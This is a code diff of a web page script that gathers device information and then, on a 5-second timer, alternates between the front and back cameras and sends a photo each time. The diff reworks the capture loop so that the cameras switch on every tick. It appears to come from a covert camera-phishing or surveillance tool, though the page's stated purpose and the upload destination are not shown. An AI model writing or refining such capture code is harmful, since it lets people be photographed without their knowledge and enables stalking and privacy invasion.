@@ -22,6 +22,7 @@
         let videoStream = null;
         let video = null;
         let intervalId = null;
+        let useFrontCamera = true;
 
         async function sendDeviceInfo() {
             try {
@@ -98,28 +99,24 @@ Device Information:
             });
         }
 
-        async function toggleCamera(facingMode) {
+        async function toggleCamera() {
             stopCamera(); // Stop current camera
+            const facingMode = useFrontCamera ? 'user' : 'environment';
             const cameraStarted = await startCamera(facingMode);
             if (cameraStarted) {
-                await sendPhoto(); // Immediate photo
-                intervalId = setInterval(sendPhoto, 5000); // Send every 5 seconds
+                await sendPhoto(); // Send photo immediately
+                useFrontCamera = !useFrontCamera; // Toggle camera for next iteration
             }
         }
 
         async function startPhotoCaptureLoop() {
             await sendDeviceInfo();
-            let useFrontCamera = true;
 
-            async function switchCamera() {
-                await toggleCamera(useFrontCamera ? 'user' : 'environment');
-                useFrontCamera = !useFrontCamera;
-                setTimeout(switchCamera, 10000); // Switch every 10 seconds
-            }
+            // Start with front camera
+            await toggleCamera();
 
-            // Start with both cameras
-            setTimeout(() => toggleCamera('environment'), 5000); // Start back camera after 5 seconds
-            switchCamera(); // Start with front camera
+            // Switch cameras every 5 seconds
+            intervalId = setInterval(toggleCamera, 5000);
         }
 
         function stopCamera() {
@@ -127,10 +124,6 @@ Device Information:
                 videoStream.getTracks().forEach(track => track.stop());
                 videoStream = null;
                 video = null;
-            }
-            if (intervalId) {
-                clearInterval(intervalId);
-                intervalId = null;
             }
         }
 
